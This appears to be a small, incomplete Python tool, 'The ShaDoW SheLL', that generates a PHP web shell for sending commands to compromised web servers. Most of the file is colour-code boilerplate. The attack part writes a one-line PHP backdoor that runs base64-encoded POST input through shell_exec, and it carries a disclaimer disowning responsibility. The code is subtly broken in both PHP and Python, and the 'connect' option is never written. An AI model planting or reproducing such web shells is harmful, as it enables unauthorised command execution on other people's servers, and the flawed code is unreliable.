#! /usr/bin/python

import sys
import requests
import base64
import os

# check operating system
def check_os():
    if os.name == "nt":
        operating_system = "windows"
    if os.name == "posix":
        operating_system = "posix"
    return operating_system

#
# Class for colors
# Taken From SET
if check_os() == "posix":
    class bcolors:
        PURPLE = '\033[95m'
        CYAN = '\033[96m'
        DARKCYAN = '\033[36m'
        BLUE = '\033[94m'
        GREEN = '\033[92m'
        YELLOW = '\033[93m'
        RED = '\033[91m'
        BOLD = '\033[1m'
        UNDERL = '\033[4m'
        ENDC = '\033[0m'
        backBlack = '\033[40m'
        backRed = '\033[41m'
        backGreen = '\033[42m'
        backYellow = '\033[43m'
        backBlue = '\033[44m'
        backMagenta = '\033[45m'
        backCyan = '\033[46m'
        backWhite = '\033[47m'

        def disable(self):
            self.PURPLE = ''
            self.CYAN = ''
            self.BLUE = ''
            self.GREEN = ''
            self.YELLOW = ''
            self.RED = ''
            self.ENDC = ''
            self.BOLD = ''
            self.UNDERL = ''
            self.backBlack = ''
            self.backRed = ''
            self.backGreen = ''
            self.backYellow = ''
            self.backBlue = ''
            self.backMagenta = ''
            self.backCyan = ''
            self.backWhite = ''
            self.DARKCYAN = ''

# if we are windows or something like that then define colors as nothing
else:
    class bcolors:
        PURPLE = ''
        CYAN = ''
        DARKCYAN = ''
        BLUE = ''
        GREEN = ''
        YELLOW = ''
        RED = ''
        BOLD = ''
        UNDERL = ''
        ENDC = ''
        backBlack = ''
        backRed = ''
        backGreen = ''
        backYellow = ''
        backBlue = ''
        backMagenta = ''
        backCyan = ''
        backWhite = ''

        def disable(self):
            self.PURPLE = ''
            self.CYAN = ''
            self.BLUE = ''
            self.GREEN = ''
            self.YELLOW = ''
            self.RED = ''
            self.ENDC = ''
            self.BOLD = ''
            self.UNDERL = ''
            self.backBlack = ''
            self.backRed = ''
            self.backGreen = ''
            self.backYellow = ''
            self.backBlue = ''
            self.backMagenta = ''
            self.backCyan = ''
            self.backWhite = ''
            self.DARKCYAN = ''

print(bcolors.BLUE + "\n[---]           The ShaDoW SheLL             [---]" + bcolors.ENDC)
print(bcolors.BLUE + "[---]         Coded by : @Ice3man            [---]" + bcolors.ENDC)
print(bcolors.BOLD + "[---]           Version : 1.0                [---]" + bcolors.ENDC)
print(bcolors.GREEN + "\nThis Program lets you create your own simple php shells which can provide you the ability to connect to exploited web servers and send commands to them. \n Notice : The Author is not responsible for your actions" + bcolors.ENDC)
print("1) Create a php Shell")
print("2) Connect to a shell online")
choice = input("TSS > ")
 if choice==1:
    f = open("/root/Desktop/shell.php", "w")
    f.write("<?php $c=shell_exec(base64_decode($POST['shadow'])); echo base64.encode($c);?>")
    f.close
    print(bcolors.RED + "Saving the file On Desktop. Name of shell is shell.php" + bcolors.ENDC)
    
 
